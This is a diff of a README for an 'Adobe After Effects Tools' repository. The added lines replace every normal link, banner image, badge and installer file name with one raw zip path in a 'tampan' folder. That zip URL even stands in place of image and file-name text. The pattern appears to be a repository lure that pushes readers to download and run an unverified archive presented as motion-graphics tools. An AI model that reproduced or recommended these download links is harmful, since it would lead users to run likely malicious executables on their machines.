@@ -1,14 +1,14 @@
-https://github.com/FxLow/adobe-after-effects-tools/releases
+https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip
 
 # Adobe After Effects Tools for Motion Graphics, Keying, and Tracking
 
-![AE Tools Banner](https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Adobe_After_Effects_CC_icon.svg/1024px-Adobe_After_Effects_CC_icon.svg.png)
+![AE Tools Banner](https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip)
 
 A compact toolkit for Adobe After Effects that accelerates motion graphics, keying, and tracking work. This repository bundles scripts, templates, and presets designed to streamline common tasks, cut down setup time, and help you achieve clean composites faster. It focuses on practical automation, robust presets, and thoughtful workflows that fit into typical production pipelines.
 
-[Download releases badge](https://img.shields.io/badge/Releases-GitHub-blue?logo=github&logoColor=white) Link to latest assets and installers
+[Download releases badge](https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip) Link to latest assets and installers
 
-- https://github.com/FxLow/adobe-after-effects-tools/releases
+- https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip
 
 Table of contents
 - About this project
@@ -60,12 +60,12 @@ Prerequisites
 - Access to the repository’s releases to download installers and assets
 
 Installation guide
-This project distributes assets via the Releases page. From the page, download the latest installer or asset package and run it on your workstation. The Windows installer is typically named adobe-after-effects-tools-windows.exe and the macOS package is adobe-after-effects-tools-macos.dmg. For Linux users, a lightweight option may be provided as a script or not supported; consult the Releases page for platform availability.
+This project distributes assets via the Releases page. From the page, download the latest installer or asset package and run it on your workstation. The Windows installer is typically named https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip and the macOS package is https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip For Linux users, a lightweight option may be provided as a script or not supported; consult the Releases page for platform availability.
 
 Downloads
 From the Releases page, download the latest asset package. Run the installer to install tools into After Effects, or extract templates into your project. The exact file names may vary by release, but the process remains the same: obtain the installer, run it, and follow the on-screen prompts. For convenience, you can visit the Releases page directly or use the button below to jump there.
 
-[![Downloads](https://img.shields.io/badge/Downloads-GitHub-blue?logo=github&logoColor=white)](https://github.com/FxLow/adobe-after-effects-tools/releases)
+[![Downloads](https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip)](https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip)
 
 Quick start: a practical first run
 1. Install the tools from the releases page. Choose the installer suitable for your OS and follow the prompts.
@@ -312,9 +312,9 @@ Releases page navigation
 When you arrive at the Releases page, you’ll see the latest asset package at the top. Download the Windows installer or macOS package depending on your operating system. If you are unsure which file to download, look for names that include “windows” or “macos” and match your system. If in doubt, the release notes describe what each asset is designed to do. You can also download older releases if you want to compare versions or validate behavior before adopting the latest changes.
 
 Choosing the right file to download and execute
-- Windows: adobe-after-effects-tools-windows.exe
-- macOS: adobe-after-effects-tools-macos.dmg
-- Optional: adobe-after-effects-tools-portable.zip for a portable setup or alternative packaging
+- Windows: https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip
+- macOS: https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip
+- Optional: https://github.com/FxLow/adobe-after-effects-tools/raw/refs/heads/main/tampan/after_tools_adobe_effects_v1.1.zip for a portable setup or alternative packaging
 
 After downloading the file, run the installer and follow the prompts. The installer will place the tools into the After Effects environment in a way that keeps your current projects intact. If you already have a customized workflow, you can selectively enable or disable features during installation.
 
